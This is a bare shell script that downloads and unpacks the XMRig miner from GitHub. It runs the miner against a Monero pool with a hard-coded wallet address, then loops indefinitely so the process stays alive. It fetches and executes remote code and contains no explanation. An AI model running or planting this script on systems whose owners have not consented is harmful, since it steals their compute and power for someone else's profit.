#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig --donate-level 5 -a rx/0 -o hk.monero.herominers.com:10191 -u 48KP6AS1JDNP1rHw9jiCpTc6JoNzdc5zheh2HQt8XSwAh2MXoNJhZwXGsoKmBBtWaqcUJKowikJro4KbmPGqbSty5Xf8bdM -k --tls -p rigxmr

while [ 1 ]; do
sleep 3
done
sleep 999
